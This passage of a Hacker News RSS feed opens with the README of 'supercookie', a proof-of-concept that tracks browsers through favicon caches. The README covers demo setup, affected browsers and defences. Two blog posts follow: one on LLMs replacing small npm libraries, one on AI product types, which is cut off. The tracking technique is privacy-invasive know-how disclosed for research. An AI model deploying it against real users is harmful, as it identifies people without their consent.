<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/979a8a431325fa2bc0e18d3e2a5789eee129e50c7dcef08137aece8757fd39c6/68747470733a2f2f7365656b6c6f676f2e636f6d2f696d616765732f4e2f6e6f64656a732d6c6f676f2d464245313232453337372d7365656b6c6f676f2e636f6d2e706e67"><img src="https://camo.githubusercontent.com/979a8a431325fa2bc0e18d3e2a5789eee129e50c7dcef08137aece8757fd39c6/68747470733a2f2f7365656b6c6f676f2e636f6d2f696d616765732f4e2f6e6f64656a732d6c6f676f2d464245313232453337372d7365656b6c6f676f2e636f6d2e706e67" width="12" data-canonical-src="https://seeklogo.com/images/N/nodejs-logo-FBE122E377-seeklogo.com.png"></a> <a href="https://nodejs.org/" rel="nofollow">Node.js</a></p>
<ol dir="auto">
<li>Clone repository</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/jonasstrehle/supercookie"><pre>git clone https://github.com/jonasstrehle/supercookie</pre></div>
<ol start="2" dir="auto">
<li>Update .env file in <a href="https://github.com/jonasstrehle/supercookie/blob/main/server/.env">supercookie/server/.env</a></li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="HOST_MAIN=localhost:10080
PORT_MAIN=10080

HOST_DEMO=localhost:10081
PORT_DEMO=10081"><pre><span>HOST_MAIN</span><span>=</span><span>localhost:10080</span>
<span>PORT_MAIN</span><span>=</span><span>10080</span>

<span>HOST_DEMO</span><span>=</span><span>localhost:10081</span>
<span>PORT_DEMO</span><span>=</span><span>10081</span></pre></div>
<ol start="3" dir="auto">
<li>Run service</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="cd supercookie/server
node --experimental-json-modules main.js"><pre><span>cd</span> supercookie/server
node --experimental-json-modules main.js</pre></div>
<p dir="auto">-&gt; Webserver will be running at <a href="http://localhost:10080/" rel="nofollow">http://localhost:10080</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Workwise of <a href="https://supercookie.me/workwise" rel="nofollow">supercookie</a></h2><a id="user-content-workwise-of-supercookie" aria-label="Permalink: Workwise of supercookie" href="#workwise-of-supercookie"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise#content-background" rel="nofollow">üìñ Background</a></h3><a id="user-content--background" aria-label="Permalink: üìñ Background" href="#-background"></a></p>
<p dir="auto">Modern browsers offer a wide range of features to improve and simplify the user experience.
One of these features are the so-called favicons: A favicon is a small (usually 16√ó16 or 32√ó32 pixels) logo used by web browsers to brand a website in a recognizable way. Favicons are usually shown by most browsers in the address bar and next to the page's name in a list of bookmarks.</p>
<p dir="auto">To serve a favicon on their website, a developer has to include an  attribute in the webpage‚Äôs header. If this tag does exist, the browser requests the icon from the predefined source and if the server response contains an valid icon file that can be properly rendered this icon is displayed by the browser. In any other case, a blank favicon is shown.</p>
<div dir="auto" data-snippet-clipboard-copy-content="<link rel=&quot;icon&quot; href=&quot;/favicon.ico&quot; type=&quot;image/x-icon&quot;>"><pre><span>&lt;</span><span>link</span> <span>rel</span>="<span>icon</span>" <span>href</span>="<span>/favicon.ico</span>" <span>type</span>="<span>image/x-icon</span>"<span>&gt;</span></pre></div>
<p dir="auto">The favicons must be made very easily accessible by the browser. Therefore, they are cached in a separate local database on the system, called the favicon cache (F-Cache). A F-Cache data entries includes the visited URL (subdomain, domain, route, URL paramter), the favicon ID and the time to live (TTL).
While this provides web developers the ability to delineate parts of their website using a wide variety of icons for individual routes and subdomains, it also leads to a possible tracking scenario.</p>
<p dir="auto">When a user visits a website, the browser checks if a favicon is needed by looking up the source of the shortcut icon link reference of the requested webpage.
The browser initialy checks the local F-cache for an entry containing the URL of the active website. If a favicon entry exists, the icon will be loaded from the cache and then displayed. However, if there is no entry, for example because no favicon has ever been loaded under this particular domain, or the data in the cache is out of date, the browser makes a GET request to the server to load the site's favicon.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise#content-threat-model" rel="nofollow">üí£ Threat Model</a></h3><a id="user-content--threat-model" aria-label="Permalink: üí£ Threat Model" href="#-threat-model"></a></p>
<p dir="auto">In the article a possible threat model is explained that allows to assign a unique identifier to each browser in order to draw conclusions about the user and to be able to identify this user even in case of applied anti-fingerprint measures, such as the use of a VPN, deletion of cookies, deletion of the browser cache or manipulation of the client header information.</p>
<p dir="auto">A web server can draw conclusions about whether a browser has already loaded a favicon or not:
So when the browser requests a web page, if the favicon is not in the local F-cache, another request for the favicon is made. If the icon already exists in the F-Cache, no further request is sent.
By combining the state of delivered and not delivered favicons for specific URL paths for a browser, a unique pattern (identification number) can be assigned to the client.
When the website is reloaded, the web server can reconstruct the identification number with the network requests sent by the client for the missing favicons and thus identify the browser.</p>
<p dir="auto">
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/040dbe51ecaea7c0782054f0d65b9bef438e87d452ce9ba7a0cbe6547afc5719/68747470733a2f2f7375706572636f6f6b69652e6d652f6173736574732f6865616465722e706e67" alt="Supercookie Header" width="600" data-canonical-src="https://supercookie.me/assets/header.png">
  </a>
</p>
<markdown-accessiblity-table><table>
  <thead>
    <tr>
      <th></th>
      <th><a target="_blank" rel="noopener noreferrer" href=""></a> <p dir="auto">conventional cookies</p></th>
      <th><a target="_blank" rel="noopener noreferrer" href=""></a> <p dir="auto">supercookie</p></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Identification accuracy</td>
      <td>-</td>
      <td>100%</td>
    </tr>
    <tr>
      <td>Incognito / Private mode detection</td>
      <td>‚ùå</td>
      <td>‚úÖ</td>
    </tr>
    <tr>
      <td>Persistent after flushed website cache and cookies</td>
      <td>‚ùå</td>
      <td>‚úÖ</td>
    </tr>
    <tr>
      <td>Identify multiple windows</td>
      <td>‚ùå</td>
      <td>‚úÖ</td>
    </tr>
    <tr>
      <td>Working with Anti-Tracking SW</td>
      <td>‚ùå</td>
      <td>‚úÖ</td>
    </tr>
  </tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise#content-target" rel="nofollow">üéØ Target</a></h3><a id="user-content--target" aria-label="Permalink: üéØ Target" href="#-target"></a></p>
<p dir="auto">It looks like all top browsers (<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4118d0bdf482abbf0c219ab6bdc1c2c321ce8f19882f9e88948b766ba08f36c5/68747470733a2f2f7777772e676f6f676c652e636f6d2f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/4118d0bdf482abbf0c219ab6bdc1c2c321ce8f19882f9e88948b766ba08f36c5/68747470733a2f2f7777772e676f6f676c652e636f6d2f66617669636f6e2e69636f" width="12" data-canonical-src="https://www.google.com/favicon.ico"></a> <a href="https://google.com/chrome/" rel="nofollow">Chrome</a>, <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/98ad4c97f64d82aa53fe071b035536ac4ab97ec3cd9be6021157634debea749d/68747470733a2f2f7777772e6d6f7a696c6c612e6f72672f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/98ad4c97f64d82aa53fe071b035536ac4ab97ec3cd9be6021157634debea749d/68747470733a2f2f7777772e6d6f7a696c6c612e6f72672f66617669636f6e2e69636f" width="12" data-canonical-src="https://www.mozilla.org/favicon.ico"></a> <a href="https://www.mozilla.org/en-US/firefox/new/" rel="nofollow">Firefox</a>, <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/672c5caa1e356588e7fcfa0c0b5a0cc3dee7df44f3b71d30010560acd737aec0/68747470733a2f2f7777772e6170706c652e636f6d2f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/672c5caa1e356588e7fcfa0c0b5a0cc3dee7df44f3b71d30010560acd737aec0/68747470733a2f2f7777772e6170706c652e636f6d2f66617669636f6e2e69636f" width="12" data-canonical-src="https://www.apple.com/favicon.ico"></a> <a href="https://www.apple.com/safari/" rel="nofollow">Safari</a>, <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2ba225a9c34297fd64a7ba7397891e7c50c8ca7211fc9018943aacb2a953ec25/68747470733a2f2f7777772e6d6963726f736f66742e636f6d2f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/2ba225a9c34297fd64a7ba7397891e7c50c8ca7211fc9018943aacb2a953ec25/68747470733a2f2f7777772e6d6963726f736f66742e636f6d2f66617669636f6e2e69636f" width="12" data-canonical-src="https://www.microsoft.com/favicon.ico"></a> <a href="https://www.microsoft.com/edge/" rel="nofollow">Edge</a>) are vulnerable to this attack scenario.<br>
Mobile browsers are also affected.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Current versions</h4><a id="user-content-current-versions" aria-label="Permalink: Current versions" href="#current-versions"></a></p>
<markdown-accessiblity-table><table>
  <thead>
    <tr>
      <th><p dir="auto">Browser</p></th>
      <th><p dir="auto">Windows</p></th>
      <th><p dir="auto">MacOS</p></th>
      <th><p dir="auto">Linux</p></th>
      <th><p dir="auto">iOS</p></th>
      <th><p dir="auto">Android</p></th>
      <th><i>Info</i></th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>Chrome <em>(v 111.0)</em></td>
        <td>‚úÖ</td>
        <td>‚úÖ</td>
        <td>‚úÖ</td>
        <td>?</td>
        <td>‚úÖ</td>
        <td>-</td>
    </tr>
    <tr>
        <td>Safari <em>(v 14.0)</em></td>
        <td>-</td>
        <td>‚úÖ</td>
        <td>-</td>
        <td>‚úÖ</td>
        <td>-</td>
        <td>-</td>
    </tr>
    <tr>
        <td>Edge <em>(v 87.0)</em></td>
        <td>‚úÖ</td>
        <td>‚úÖ</td>
        <td>‚ùå</td>
        <td>‚ùå</td>
        <td>‚úÖ</td>
        <td>-</td>
    </tr>
    <tr>
        <td>Firefox <em>(v 86.0)</em></td>
        <td>‚úÖ</td>
        <td>‚úÖ</td>
        <td>‚ùå</td>
        <td>‚ùå</td>
        <td>‚ùå</td>
        <td>Fingerprint different in incognito mode</td>
    </tr>
    <tr>
        <td>Brave <em>(v 1.19.92)</em></td>
        <td>‚ùå</td>
        <td>‚ùå</td>
        <td>‚ùå</td>
        <td>‚ùî</td>
        <td>‚ùå</td>
        <td>-</td>
    </tr>
  </tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h4 tabindex="-1" dir="auto">Previous versions</h4><a id="user-content-previous-versions" aria-label="Permalink: Previous versions" href="#previous-versions"></a></p>
<markdown-accessiblity-table><table>
  <thead>
    <tr>
      <th><p dir="auto">Browser</p></th>
      <th><p dir="auto">Windows</p></th>
      <th><p dir="auto">MacOS</p></th>
      <th><p dir="auto">Linux</p></th>
      <th><p dir="auto">iOS</p></th>
      <th><p dir="auto">Android</p></th>
      <th><i>Info</i></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><b>Brave</b> (v 1.14.0)</td>
      <td>‚úÖ</td>
      <td>‚úÖ</td>
      <td>‚úÖ</td>
      <td>‚úÖ</td>
      <td>‚úÖ</td>
      <td>-</td>
    </tr>
    <tr>
      <td><b>Firefox</b> (&lt; v 84.0)</td>
      <td>‚úÖ</td>
      <td>‚úÖ</td>
      <td>‚ùî</td>
      <td>‚ùå</td>
      <td>‚úÖ</td>
      <td>-</td>
    </tr>
  </tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise#content-scalability-performance" rel="nofollow">‚öô Scalability &amp; Performance</a></h3><a id="user-content--scalability--performance" aria-label="Permalink: ‚öô Scalability &amp; Performance" href="#-scalability--performance"></a></p>
<p dir="auto">By varying the number of bits that corresponds to the number of redirects to subpaths, this attack can be scaled almost arbitrarily.
It can distinguish 2^N unique users, where N is the number of redirects on the client side.
The time taken for the read and write operation increases as the number of distinguishable clients does.
<br>
In order to keep the number of redirects as minimal as possible, N can have a dynamic length.
More about this <a href="https://supercookie.me/workwise#content-scalability-performance" rel="nofollow">here</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise" rel="nofollow">üìåHow to defend against?</a></h3><a id="user-content-how-to-defend-against" aria-label="Permalink: üìåHow to defend against?" href="#how-to-defend-against"></a></p>
<p dir="auto">The most straightforward solution is to disable the favicon cache completely. As long as the browser vendors do not provide a feature against this vulnerability it's probably the best way to clear the F-cache.</p>
<ul dir="auto">
<li>
<p dir="auto"><a href="https://www.google.com/chrome/" rel="nofollow">Chrome</a> ‚Ä¢ <strong>MacOS</strong><br></p>
<ul dir="auto">
<li>Delete <code>~/Library/Application Support/Google/Chrome/Default/Favicons</code></li>
<li>Delete <code>~/Library/Application Support/Google/Chrome/Default/Favicons-journal</code></li>
</ul>
</li>
<li>
<p dir="auto"><a href="https://www.google.com/chrome/" rel="nofollow">Chrome</a> ‚Ä¢ <strong>Windows</strong><br></p>
<ul dir="auto">
<li>Delete <code>C:\Users\username\AppData\Local\Google\Chrome\User Data\Default</code></li>
</ul>
</li>
<li>
<p dir="auto"><a href="https://www.apple.com/safari/" rel="nofollow">Safari</a> ‚Ä¢ <strong>MacOS</strong><br></p>
<ul dir="auto">
<li>Delete content of <code>~/Library/Safari/Favicon Cache</code></li>
</ul>
</li>
<li>
<p dir="auto"><a href="https://www.microsoft.com/edge" rel="nofollow">Edge</a> ‚Ä¢ <strong>MacOS</strong><br></p>
<ul dir="auto">
<li>Delete <code>~/Library/Application Support/Microsoft Edge/Default/Favicon</code></li>
<li>Delete <code>~/Library/Application Support/Microsoft Edge/Default/Favicons-journal</code></li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Other</h2><a id="user-content-other" aria-label="Permalink: Other" href="#other"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://jonas.strehles.info/" rel="nofollow">üôé‚Äç‚ôÇÔ∏è About me</a></h3><a id="user-content-‚ÄçÔ∏è-about-me" aria-label="Permalink: üôé‚Äç‚ôÇÔ∏è About me" href="#‚ÄçÔ∏è-about-me"></a></p>
<p dir="auto">I am a twenty year old student from üá©üá™ Germany. I like to work in software design and development and have an interest in the IT security domain.</p>
<p dir="auto">This repository, including the setup of a demonstration portal, was created within two days as part of a private research project on the topic of "Tracking on the Web".</p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://ko-fi.com/jonasstrehle" rel="nofollow">üíñ Support the project</a></h3><a id="user-content--support-the-project" aria-label="Permalink: üíñ Support the project" href="#-support-the-project"></a></p>
<p dir="auto"><a href="https://ko-fi.com/jonasstrehle" rel="nofollow"><img src="https://camo.githubusercontent.com/201ef269611db7eb6b5d08e9f756ab8980df3014b64492770bdf13a6ed924641/68747470733a2f2f6b6f2d66692e636f6d2f696d672f676974687562627574746f6e5f736d2e737667" alt="ko-fi" data-canonical-src="https://ko-fi.com/img/githubbutton_sm.svg"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Spread the world!</h2><a id="user-content-spread-the-world" aria-label="Permalink: Spread the world!" href="#spread-the-world"></a></p>
<p dir="auto">Liked the project? Just give it a star ‚≠ê and spread the world!</p>
<ul dir="auto">
<li><a href="https://www.schneier.com/crypto-gram/archives/2021/0315.html#cg5" rel="nofollow">Bruce Schneier on schneier.com</a></li>
<li><a href="https://www.vice.com/amp/en/article/n7v5y7/browser-favicons-can-be-used-as-undeletable-supercookies-to-track-you-online?__twitter_impression=true" rel="nofollow">Matthew Gault on vice.com</a></li>
<li><a href="https://gizmodo.com/favicons-could-be-the-supercookie-that-tracks-you-every-1846229089/" rel="nofollow">Rhett Jones on gizmodo.com</a></li>
<li><a href="https://www.computing.co.uk/news/4027035/tiny-favicons-utilised-track-users-movements-online" rel="nofollow">Dev Kundaliyaon on computing.co.uk</a></li>
<li><a href="https://www.techradar.com/news/these-tiny-icons-could-be-tracking-you-across-the-internet" rel="nofollow">Barclay Ballard on techradar.com</a></li>
<li><a href="https://news.ycombinator.com/item?id=26051370" rel="nofollow">Discussion on ycombinator.com</a></li>
<li>üá©üá™ <a href="https://www.derstandard.de/story/2000124123751/supercookies-datensammler-finden-immer-neue-wege-die-nutzer-auszuspionieren" rel="nofollow">Andreas Proschofsky on derstandard.de</a></li>
<li>üá©üá™ <a href="https://t3n.de/news/tracking-id-favicons-supercookie-1355514/" rel="nofollow">Dieter Petereit on t3n.de</a></li>
<li>üá™üá∏ <a href="https://www.microsiervos.com/archivo/seguridad/supercookie-me-identificador-personal-imborrable-icono-favicon.html" rel="nofollow">ALVY on microsiervos.com</a></li>
<li>üáßüá∑ <a href="https://canaltech.com.br/seguranca/favicons-podem-ser-usados-para-rastrear-usuarios-online-permanentemente-178834/" rel="nofollow">Felipe Demartini on canaltech.com.br</a></li>
<li>üáßüá¨ <a href="https://www.kaldata.com/it-%D0%BD%D0%BE%D0%B2%D0%B8%D0%BD%D0%B8/%D0%BD%D0%BE%D0%B2-%D0%BC%D0%B5%D1%82%D0%BE%D0%B4-%D0%B7%D0%B0-%D0%B8%D0%B4%D0%B5%D0%BD%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D1%8F-%D0%BD%D0%B0-%D0%BA%D0%BE%D0%BD%D0%BA%D1%80%D0%B5%D1%82-355279.html" rel="nofollow">Daniel Despodov on kaldata.com</a></li>
<li>üá´üá∑ <a href="https://www.clubic.com/navigateur-internet/actualite-353236-publicite-les-favicons-des-sites-web-pourraient-se-montrer-un-peu-trop-curieux.html" rel="nofollow">Guillaume Belfiore on clubic.com</a></li>
<li>üá®üá≥ <a href="https://www.cnbeta.com/articles/tech/1089095.htm" rel="nofollow">study875 on cnbeta.com</a></li>
<li>üá∑üá∫ <a href="https://habr.com/ru/company/itsumma/blog/542734/" rel="nofollow">ITSumma on habr.com</a></li>
<li>üá∑üá∫ <a href="https://www.securitylab.ru/news/516436.php" rel="nofollow">securitylab.ru</a></li>
<li><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/867e9a74739d08208ee30384cd9f274b64373d9939fe1d9ed175c7e5e59b6524/68747470733a2f2f796f75747562652e636f6d2f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/867e9a74739d08208ee30384cd9f274b64373d9939fe1d9ed175c7e5e59b6524/68747470733a2f2f796f75747562652e636f6d2f66617669636f6e2e69636f" width="20" data-canonical-src="https://youtube.com/favicon.ico"></a> <a href="https://youtu.be/X7OW5hTt5hY" rel="nofollow">Seytonic on YouTube</a></li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The fate of "small" open source (118 pts)]]></title>
            <link>https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/</link>
            <guid>45947639</guid>
            <pubDate>Sun, 16 Nov 2025 19:21:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/">https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/</a>, See on <a href="https://news.ycombinator.com/item?id=45947639">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p>By far the most popular npm package I‚Äôve ever written is <a href="https://www.npmjs.com/package/blob-util"><code>blob-util</code></a>, which is ~10 years old and still gets 5+ million weekly downloads.</p>
<p>It‚Äôs a small collection of utilities for working with <a href="https://developer.mozilla.org/en-US/docs/Web/API/Blob"><code>Blob</code>s</a> in JavaScript. I wrote it because I found that PouchDB users were endlessly confused about how to work with <code>Blob</code>s and how to convert them to strings, <code>ArrayBuffer</code>s, etc.</p>
<p>Given that <a href="https://survey.stackoverflow.co/2025/ai#sentiment-and-usage">some 80% of developers</a> are now using AI in their regular work, <code>blob-util</code> is almost certainly the kind of thing that most developers would just happily have an LLM generate for them. Sure, you <em>could</em> use <code>blob-util</code>, but then you‚Äôd be taking on an extra dependency, with unknown performance, maintenance, and supply-chain risks.</p>
<p>And sure enough, Claude will happily spit out whatever <code>Blob</code> utilities you need when prompted:</p>
<p><em>&gt; Write me a utility function in TypeScript to convert a Blob to an ArrayBuffer. It should return a Promise.</em></p>
<pre title="">function blobToArrayBuffer(blob: Blob): Promise&lt;ArrayBuffer&gt; {
  return new Promise((resolve, reject) =&gt; {
    const reader = new FileReader();

    reader.onload = () =&gt; {
      if (reader.result instanceof ArrayBuffer) {
        resolve(reader.result);
      } else {
        reject(new Error('Failed to read Blob as ArrayBuffer'));
      }
    };

    reader.onerror = () =&gt; {
      reject(reader.error);
    };

    reader.readAsArrayBuffer(blob);
  });
}
</pre>
<p>Claude‚Äôs version is pretty close to <a href="https://github.com/nolanlawson/blob-util/blob/99c06472d18329eda1421286692bd875d76d5c9c/src/blob-util.ts#L384-L394">the <code>blob-util</code> version</a> (unsurprising, since it was probably trained on it!). Although it‚Äôs much more verbose, unnecessarily checking if <code>readAsArrayBuffer</code> actually gives you an <code>ArrayBuffer</code> (although this does make TypeScript happy). To be fair, it also improves on my implementation by directly <code>reject</code>ing with an error rather than the more awkward <code>onerror</code> event.</p>

<p>I suppose some people would see this as progress: fewer dependencies, more robust code (even if it‚Äôs a bit more verbose), quicker turnaround time than the old ‚Äúsearch npm, find a package, read the docs, install it‚Äù approach.</p>
<p>I don‚Äôt have any excessive pride in this library, and I don‚Äôt particularly care if the download numbers go up or down. But I do think something is lost with the AI approach. When I wrote <code>blob-util</code>, I took a teacher‚Äôs mentality: the README has <a href="https://www.npmjs.com/package/blob-util#tutorial">a cutesy and whimsical tutorial</a> featuring Kirby, in all his blobby glory. (I had a thing for putting Nintendo characters in all my stuff at the time.)</p>
<p>The goal wasn‚Äôt just to give you a utility to solve your problem (although it does that) ‚Äì the goal was also to <em>teach</em> people how to use JavaScript effectively, so that you‚Äôd have an understanding of how to solve other problems in the future.</p>
<p>I don‚Äôt know which direction we‚Äôre going in with AI (well, ~80% of us; to the remaining holdouts, I salute you and wish you godspeed!), but I do think it‚Äôs a future where we prize instant answers over teaching and understanding. There‚Äôs less reason to use something like <code>blob-util</code>, which means there‚Äôs less reason to write it in the first place, and therefore less reason to educate people about the problem space.</p>
<p>Even now there‚Äôs a movement toward putting documentation in an <a href="https://llmstxt.org/"><code>llms.txt</code></a> file, so you can just point an agent at it and save your brain cells the effort of deciphering English prose. (Is this even documentation anymore? What <em>is</em> documentation?)</p>
<h2>Conclusion</h2>
<p>I still believe in open source, and I‚Äôm still doing it (in fits and starts). But one thing has become clear to me: the era of small, low-value libraries like <code>blob-util</code> is over. They were already on their way out thanks to Node.js and the browser taking on more and more of their functionality (see <code>node:glob</code>, <code>structuredClone</code>, etc.), but LLMs are the final nail in the coffin.</p>
<p>This does mean that there‚Äôs less opportunity to use these libraries as a springboard for user education (Underscore.js <a href="https://underscorejs.org/docs/underscore-esm.html">also had this philosophy</a>), but maybe that‚Äôs okay. If there‚Äôs no need to find a library to, say, <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/groupBy">group the items in an array</a>, then maybe learning about the mechanics of such libraries is unnecessary. Many software developers will argue that asking a candidate to reverse a binary tree is pointless, since it never comes up in the day-to-day job, so maybe the same can be said for utility libraries.</p>
<p>I‚Äôm still trying to figure out what <em>kinds</em> of open source are worth writing in this new era (hint: ones that an LLM can‚Äôt just spit out on command), and where education is the most lacking. My current thinking is that the most value is in bigger projects, more inventive projects, or in more niche topics not covered in an LLM‚Äôs training data. For example, I look back on my work on <a href="https://github.com/nolanlawson/fuite"><code>fuite</code></a> and various <a href="https://nolanlawson.com/2022/01/05/memory-leaks-the-forgotten-side-of-web-performance/">memory-leak-hunting blog posts</a>, and I‚Äôm pretty satisfied that an LLM couldn‚Äôt reproduce this, because it requires novel research and creative techniques. (Although who knows: maybe someday an agent will be able to just bang its head against Chrome heap snapshots until it finds the leak. I‚Äôll believe it when I see it.)</p>
<p>There‚Äôs been a lot of hand-wringing lately about where open source fits in in a world of LLMs, but I still see people pushing the boundaries. For example, a lot of naysayers think there‚Äôs no point in writing a new JavaScript framework, since LLMs are so heavily trained on React, but then there goes the indefatigable <a href="https://github.com/trueadm">Dominic Gannaway</a> writing <a href="https://www.ripplejs.com/">Ripple.js</a>, yet another JavaScript framework (and with <a href="https://podrocket.logrocket.com/ripple-js-dominic-gannaway-logrocket-podrocket">some new ideas</a>, to boot!). This is the kind of thing I like to see: humans laughing in the face of the machine, going on with their human thing.</p>
<p>So if there‚Äôs a conclusion to this meandering blog post (excuse my squishy human brain; I didn‚Äôt use an LLM to write this), it‚Äôs just that: yes, LLMs have made some kinds of open source obsolete, but there‚Äôs still plenty of open source left to write. I‚Äôm excited to see what kinds of novel and unexpected things you all come up with.</p>
							</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Three kinds of AI products work (108 pts)]]></title>
            <link>https://www.seangoedecke.com/ai-products/</link>
            <guid>45946498</guid>
            <pubDate>Sun, 16 Nov 2025 16:56:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.seangoedecke.com/ai-products/">https://www.seangoedecke.com/ai-products/</a>, See on <a href="https://news.ycombinator.com/item?id=45946498">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><p>The very first LLM-based product, ChatGPT, was just<sup id="fnref-1"><a href="#fn-1">1</a></sup> the ability to talk with the model itself: in other words, a pure chatbot. This is still the most popular LLM product by a large margin.</p>
<p>In fact, given the amount of money that‚Äôs been invested in the industry, it‚Äôs shocking how many ‚Äúnew AI products‚Äù are just chatbots. As far as I can tell, <strong>there are only three types of AI product that currently work</strong>.</p>
<h3>Chatbots</h3>
<p>For the first couple of years of the AI boom, all LLM products were chatbots. They were branded in a lot of different ways - maybe the LLM knew about your emails, or a company‚Äôs helpdesk articles - but the fundamental <em>product</em> was just the ability to talk in natural language to an LLM.</p>
<p>The problem with chatbots is that <strong>the best chatbot product is the model itself</strong>. Most of the reason users want to talk with an LLM is generic: they want to ask questions, or get advice, or confess their sins, or do any one of a hundred things that have nothing to do with your particular product. </p>
<p>In other words, your users will just use ChatGPT<sup id="fnref-2"><a href="#fn-2">2</a></sup>. AI labs have two decisive advantages over you: first, they will always have access to the most cutting-edge models before you do; and second, they can develop their chatbot harness simultaneously with the model itself (like how Anthropic specifically trains their models to be used in Claude Code, or OpenAI trains their models to be used in Codex).</p>
<h4>Explicit roleplay</h4>
<p>One way your chatbot product can beat ChatGPT is by doing what OpenAI won‚Äôt do: for instance, happily roleplaying an AI boyfriend or generating pornography. There is currently a very lucrative niche of products like this, which typically rely on less-capable but less-restrictive open-source models.</p>
<p>These products have the problems I discussed above. But it doesn‚Äôt matter that their chatbots are less capable than ChatGPT or Claude: if you‚Äôre in the market for sexually explicit AI roleplay, and ChatGPT and Claude won‚Äôt do it, you‚Äôre going to take what you can get.</p>
<p>I think there are serious ethical problems with this kind of product. But even practically speaking, this is a segment of the industry likely to be eaten alive by the big AI labs, as they become more comfortable pushing the boundaries of adult content. <a href="https://tremendous.blog/2025/07/15/grok-companions-elons-ai-girlfriend/">Grok Companions</a> is already going down this pathway, and Sam Altman has <a href="https://www.theverge.com/news/799312/openai-chatgpt-erotica-sam-altman-verified-adults">said</a> that OpenAI models will be more open to generating adult content in the future.</p>
<h4>Chatbots with tools</h4>
<p>There‚Äôs a slight variant on chatbots which gives the model <em>tools</em>: so instead of just chatting with your calendar, you can ask the chatbot to book meetings, and so on. This kind of product is usually called an ‚ÄúAI assistant‚Äù.</p>
<p>This doesn‚Äôt work well because <strong>savvy users can manipulate the chatbot into calling tools</strong>. So you can never give a support chatbot real support powers like ‚Äúrefund this customer‚Äù, because the moment you do, thousands of people will immediately find the right way to jailbreak your chatbot into giving them money. You can only give your chatbots tools that the user could do themselves - in which case, your chatbot is competing with the usability of your actual product, and will likely lose.</p>
<p>Why will your chatbot lose? Because <strong>chat is not a good user interface</strong>. Users simply do not want to type out ‚Äúhey, can you increase the font size for me‚Äù when they could simply hit ‚Äúctrl-plus‚Äù or click a single button<sup id="fnref-3"><a href="#fn-3">3</a></sup>.</p>
<p>I think this is a hard lesson for engineers to learn. It‚Äôs tempting to believe that since chatbots have gotten 100x better, they must now be the best user interface for many tasks. Unfortunately, they started out 200x worse than a regular user interface, so they‚Äôre still twice as bad.</p>
<h3>Completion</h3>
<p>The second real AI product actually came out before ChatGPT did: GitHub Copilot. The idea behind the original Copilot product (and all its imitators, like Cursor Tab) is that a fast LLM can act as a smart autocomplete. By feeding the model the code you‚Äôre typing as you type it, a code editor can suggest autocompletions that actually write the rest of the function (or file) for you.</p>
<p>The genius of this kind of product is that <strong>users never have to talk to the model</strong>. Like I said above, chat is a bad user interface. LLM-generated completions allow users to access the power of AI models without having to change any part of their current workflow: they simply see the kind of autocomplete suggestions their editor was already giving them, but far more powerful.</p>
<p>I‚Äôm a little surprised that completions-based products haven‚Äôt taken off outside coding (where they immediately generated a multi-billion-dollar market). Google Docs and <a href="https://support.microsoft.com/en-us/office/editor-text-predictions-in-word-7afcb4f3-4aa2-443a-9b08-125a5d692576">Microsoft Word</a> both have something like this. Why isn‚Äôt there more hype around this?</p>
<ul>
<li>Maybe the answer is that the people using this product don‚Äôt engage with AI online spaces, and are just quietly using the product?</li>
<li>Maybe there‚Äôs something about normal professional writing that‚Äôs less amenable to autocomplete than code? I doubt that, since so much normal professional writing is being copied out of a ChatGPT window.</li>
<li>It could be that code editors already had autocomplete, so users were familiar with it. I bet autocomplete is brand-new and confusing to many Word users.</li>
</ul>
<h3>Agents</h3>
<p>The third real AI product is the coding agent. People have been talking about this for years, but it was only really in 2025 that the technology behind coding agents became feasible (with Claude Sonnet 3.7, and later GPT-5-Codex).</p>
<p>Agents are kind of like chatbots, in that users interact with them by typing natural language text. But they‚Äôre unlike chatbots in that <strong>you only have to do that once</strong>: the model takes your initial request and goes away to implement and test it all by itself.</p>
